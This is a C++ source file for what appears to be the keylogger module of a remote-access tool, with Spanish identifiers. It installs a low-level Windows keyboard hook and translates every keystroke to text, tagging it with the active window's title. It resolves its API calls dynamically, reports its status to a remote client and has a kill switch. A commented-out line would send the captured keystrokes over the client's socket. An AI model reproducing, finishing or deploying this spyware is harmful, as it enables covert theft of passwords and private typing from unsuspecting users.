#include "cliente.hpp"
#include "mod_keylogger.hpp"
#include "misc.hpp"

extern Cliente* cCliente;

HHOOK kHook = nullptr;
mod_Keylogger* mod_Instance = nullptr;
std::mutex mtx_buffer;
std::vector<char> cBuffer;
bool g_Run = false;

void Add_Data(const std::string strData) {
    std::unique_lock<std::mutex> lock(mtx_buffer);
    for (char c : strData) {
        cBuffer.push_back(c);
    }
}

void Clear_Data(int iPosStop) {
    std::unique_lock<std::mutex> lock(mtx_buffer);
    if (iPosStop > 0 && iPosStop <= cBuffer.size()) {
        cBuffer.erase(cBuffer.begin(), cBuffer.begin() + iPosStop);
    }
}

std::string Get_Data() {
    std::unique_lock<std::mutex> lock(mtx_buffer);
    std::string strData = "";
    if (cBuffer.size() > 0) {
        cBuffer.push_back('\0');
        strData = cBuffer.data();
    }
    return strData;
}


std::string GetActiveWindow_Title() {
    char buffer[1024];
    ZeroMemory(buffer, 1024);
    std::string strOut = "";
    if (mod_Instance->USER32.pGetWindowTextA && mod_Instance->USER32.pGetForegroundWindow) {
        if (mod_Instance->USER32.pGetWindowTextA(mod_Instance->USER32.pGetForegroundWindow(), buffer, 1024) == 0) {
            strOut = "Sin Titulo";
        }else {
            strOut = buffer;
        }
    }
    return strOut;
}

std::string Add_Terminator(const char* cBuffer) {
    char cTmpBuff[20] = "[/";
    for (u_int i = 1; i < strlen(cBuffer); i++) {
        cTmpBuff[i + 1] = cBuffer[i];
    }
    return std::string(cTmpBuff);
}

const char* c_KeyMap(int iCode) {
    switch (iCode) {
    case 27:
        return "[ESC]";
        break;
    case 9:
        return "[TAB]\t";
        break;
    case 13:
        return "[ENTER]\n";
        break;
    case 32:
        return " ";
        break;
    case 37:
        return "[LARROW]";
        break;
    case 38:
        return "[UARROW]";
        break;
    case 39:
        return "[RARROW]";
        break;
    case 40:
        return "[DARROW]";
        break;
    case 8:
        return "[DEL]";
        break;
    case 17:
        return "[CTRL]";
        break;
    case 162:
        return "[LCTRL]";
        break;
    case 163:
        return "[RCTRL]";
        break;
    case 16:
        return "[SHIFT]";
        break;
    case 160:
        return "[LSHIFT]";
        break;
    case 161:
        return "[RSHIFT]";
        break;
    case 18:
        return "[MENU]";
        break;
    case 164:
        return "[LMENU]";
        break;
    case 165:
        return "[RMENU]";
        break;
    case 20:
        return "[CAPS]";
        break;
    case 144:
        return "[NLOCK]";
        break;
    case 91:
        return "[LWIN]";
        break;
    case 92:
        return "[RWIN]";
        break;
    case 65:
        return "a";
        break;
    case 66:
        return "b";
        break;
    case 67:
        return "c";
        break;
    case 68:
        return "d";
        break;
    case 69:
        return "e";
        break;
    case 70:
        return "f";
        break;
    case 71:
        return "g";
        break;
    case 72:
        return "h";
        break;
    case 73:
        return "i";
        break;
    case 74:
        return "j";
        break;
    case 75:
        return "k";
        break;
    case 76:
        return "l";
        break;
    case 77:
        return "m";
        break;
    case 78:
        return "n";
        break;
    case 79:
        return "o";
        break;
    case 80:
        return "p";
        break;
    case 81:
        return "q";
        break;
    case 82:
        return "r";
        break;
    case 83:
        return "s";
        break;
    case 84:
        return "t";
        break;
    case 85:
        return "u";
        break;
    case 86:
        return "v";
        break;
    case 87:
        return "w";
        break;
    case 88:
        return "x";
        break;
    case 89:
        return "y";
        break;
    case 90:
        return "z";
        break;
    case 96:
        return "[D0]";
        break;
    case 97:
        return "[D1]";
        break;
    case 98:
        return "[D2]";
        break;
    case 99:
        return "[D3]";
        break;
    case 100:
        return "[D4]";
        break;
    case 101:
        return "[D5]";
        break;
    case 102:
        return "[D6]";
        break;
    case 103:
        return "[D7]";
        break;
    case 104:
        return "[D8]";
        break;
    case 105:
        return "[D9]";
        break;
    case 111:
        return "[D/]";
        break;
    case 106:
        return "[D*]";
        break;
    case 109:
        return "[D-]";
        break;
    case 107:
        return "[D+]";
        break;
    case 110:
        return "[D.]";
        break;
    case 48:
        return "0";
        break;
    case 49:
        return "1";
        break;
    case 50:
        return "2";
        break;
    case 51:
        return "3";
        break;
    case 52:
        return "4";
        break;
    case 53:
        return "5";
        break;
    case 54:
        return "6";
        break;
    case 55:
        return "7";
        break;
    case 56:
        return "8";
        break;
    case 57:
        return "9";
        break;
    case 112:
        return "[F1]";
        break;
    case 113:
        return "[F2]";
        break;
    case 114:
        return "[F3]";
        break;
    case 115:
        return "[F4]";
        break;
    case 116:
        return "[F5]";
        break;
    case 117:
        return "[F6]";
        break;
    case 118:
        return "[F7]";
        break;
    case 119:
        return "[F8]";
        break;
    case 120:
        return "[F9]";
        break;
    case 121:
        return "[F10]";
        break;
    case 122:
        return "[F11]";
        break;
    case 123:
        return "[F12]";
        break;
    case 186:
        return "[;:]";
        break;
    case 187:
        return "[+=]";
        break;
    case 188:
        return "[,]";
        break;
    case 189:
        return "[-_]";
        break;
    case 190:
        return ".";
        break;
    case 191:
        return "[/?]";
        break;
    case 192:
        return "[`~]";
        break;
    case 219:
        return "[[{]";
        break;
    case 220:
        return "[\\|]";
        break;
    case 221:
        return "[]}]";
        break;
    case 222:
        return "['\"]";
        break;
    case 45:
        return "[INS]";
        break;
    case 46:
        return "[SUPR]";
        break;
    case 36:
        return "[HOME]";
        break;
    case 35:
        return "[END]";
        break;
    case 33:
        return "[PGUP]";
        break;
    case 34:
        return "[PGDOWN]";
        break;
    default:
        return "";
        break;
    }
}

LRESULT CALLBACK Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam) {
    if (!g_Run) {
        if (mod_Instance->USER32.pUnhookWindowsHookEx && mod_Instance->USER32.pPostQuitMessage) {
            mod_Instance->USER32.pUnhookWindowsHookEx(kHook);
            kHook = nullptr;
            mod_Instance->USER32.pPostQuitMessage(0);
        }
    }
    
    if (nCode < 0) {
        if (mod_Instance->USER32.pCallNextHookEx) {
            return mod_Instance->USER32.pCallNextHookEx(kHook, nCode, wparam, lparam);
        }
    }

    std::string strTempBuffer = "";

    KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
        if ((unsigned int)kbs->vkCode == 13) { //ENTER
            strTempBuffer = "\t[[W]";
            strTempBuffer += GetActiveWindow_Title();
            strTempBuffer += "]";
        }
        strTempBuffer += c_KeyMap((unsigned int)kbs->vkCode);
        Add_Data(strTempBuffer);
    }
    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
        DWORD key = kbs->vkCode;
        if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL ||
            key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT ||
            key == VK_MENU || key == VK_LMENU || key == VK_RMENU ||
            key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN ||
            key == VK_RWIN) {

            strTempBuffer += Add_Terminator(c_KeyMap((int)kbs->vkCode));
            Add_Data(strTempBuffer);
        }

    }

    if (mod_Instance->USER32.pCallNextHookEx) {
        return mod_Instance->USER32.pCallNextHookEx(kHook, nCode, wparam, lparam);
    }
}

mod_Keylogger::mod_Keylogger() {

    this->hKernel32DLL = wrapLoadDLL("kernel32.dll");
    this->hUser32DLL = wrapLoadDLL("user32.dll");
    
    if (this->hKernel32DLL) {
        this->KERNEL32.pGetModuleHandleA = (st_Kernel32_KL::LPGETMODULEHANDLEA) wrapGetProcAddr(this->hKernel32DLL, "GetModuleHandleA"  );
    }

    if (this->hUser32DLL) {
        this->USER32.pGetWindowTextA      = (st_User32_KL::LPGETWINDOWTEXTA)     wrapGetProcAddr(this->hUser32DLL, "GetWindowTextA"     );
        this->USER32.pGetForegroundWindow = (st_User32_KL::LPGETFOREGROUNDWINDOW)wrapGetProcAddr(this->hUser32DLL, "GetForegroundWindow");
        this->USER32.pUnhookWindowsHookEx = (st_User32_KL::LPUNHOOKWINDOWSHOOKEX)wrapGetProcAddr(this->hUser32DLL, "UnhookWindowsHookEx");
        this->USER32.pCallNextHookEx      = (st_User32_KL::LPCALLNEXTHOOKEX)     wrapGetProcAddr(this->hUser32DLL, "CallNextHookEx"     );
        this->USER32.pSetWindowsHookExA   = (st_User32_KL::LPSETWINDOWSHOOKEXA)  wrapGetProcAddr(this->hUser32DLL, "SetWindowsHookExA"  );
        this->USER32.pPostQuitMessage     = (st_User32_KL::LPPOSTQUITMESSAGE)    wrapGetProcAddr(this->hUser32DLL, "PostQuitMessage"    );
        this->USER32.pPeekMessageA        = (st_User32_KL::LPPEEKMESSAGEA)       wrapGetProcAddr(this->hUser32DLL, "PeekMessageA"       );
        this->USER32.pGetMessageA         = (st_User32_KL::LPGETMESSAGEA)        wrapGetProcAddr(this->hUser32DLL, "GetMessageA"        );
        this->USER32.pTranslateMessage    = (st_User32_KL::LPTRANSLATEMESSAGE)   wrapGetProcAddr(this->hUser32DLL, "TranslateMessage"   );
        this->USER32.pDispatchMessageA    = (st_User32_KL::LPDISPATCHMESSAGEA)   wrapGetProcAddr(this->hUser32DLL, "DispatchMessageA"   );
    }

    mod_Instance = this;
}

mod_Keylogger::~mod_Keylogger() {

    if(this->hKernel32DLL) {
        wrapFreeLibrary(this->hKernel32DLL);
    }

    if (this->hUser32DLL) {
        wrapFreeLibrary(this->hUser32DLL);
    }
}

void mod_Keylogger::Start() {
    __DBG_("[!] Keylogger start");
    cCliente->m_RemoteLog("[KEYLOGGER] Iniciado");
	this->isRunning = true;
    g_Run = true;
	this->thKey = std::thread(&mod_Keylogger::CaptureKeys, this);
    this->thSend = std::thread(&mod_Keylogger::SendThread, this);
}

void mod_Keylogger::Stop() {
    __DBG_("[!] Keylogger stopping");
    std::unique_lock<std::mutex> lock(this->mtx_Run);
    this->isRunning = false;
    g_Run = false;
    lock.unlock();

    
    __DBG_("[!] Joining threads");
    if (this->thKey.joinable()) {
        this->thKey.join();
    }
    if (this->thSend.joinable()) {
        this->thSend.join();
    }

    __DBG_("[!] Keylogger stopped");
    cCliente->m_RemoteLog("[KEYLOGGER] Detenido");
}

bool mod_Keylogger::m_IsRunning() {
    std::unique_lock<std::mutex> lock(this->mtx_Run);
    return this->isRunning;
}

void mod_Keylogger::CaptureKeys() {
    if (mod_Instance->USER32.pSetWindowsHookExA && mod_Instance->KERNEL32.pGetModuleHandleA &&
        mod_Instance->USER32.pPeekMessageA && mod_Instance->USER32.pGetMessageA &&
        mod_Instance->USER32.pTranslateMessage && mod_Instance->USER32.pDispatchMessageA) {
        kHook = mod_Instance->USER32.pSetWindowsHookExA(WH_KEYBOARD_LL, Keyboard_Proc, mod_Instance->KERNEL32.pGetModuleHandleA(NULL), 0);

        MSG msg;
        mod_Instance->USER32.pPeekMessageA(&msg, NULL, 0, 0, PM_NOREMOVE);
        while (mod_Instance->USER32.pGetMessageA(&msg, NULL, 0, 0)) {
            mod_Instance->USER32.pTranslateMessage(&msg);
            mod_Instance->USER32.pDispatchMessageA(&msg);
        }
    }
}

void mod_Keylogger::SendThread() {
    while (1) {
        {
            /*std::unique_lock<std::mutex> lock(this->mtx_Run);
            if (!this->isRunning) {
                break;
            }*/
            if (!this->m_IsRunning()) {
                break;
            }

            //Kill switch
            if (cCliente->isKillSwitch()) {
                __DBG_("[KL] kill_switch...");
                cCliente->setKillSwitch(false);
                this->Stop();
                break;
            }
        }

        std::string strData = Get_Data();
        int iData_Size = strData.size();
        if (iData_Size > 0) {
            std::cout << strData << "\n";
            //cCliente->cChunkSend(cCliente->sckSocket, strData.c_str(), iData_Size, 0, true, nullptr, EnumComandos::KL_Salida);
            Clear_Data(iData_Size+1); // +1 por el byte nulo \0
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

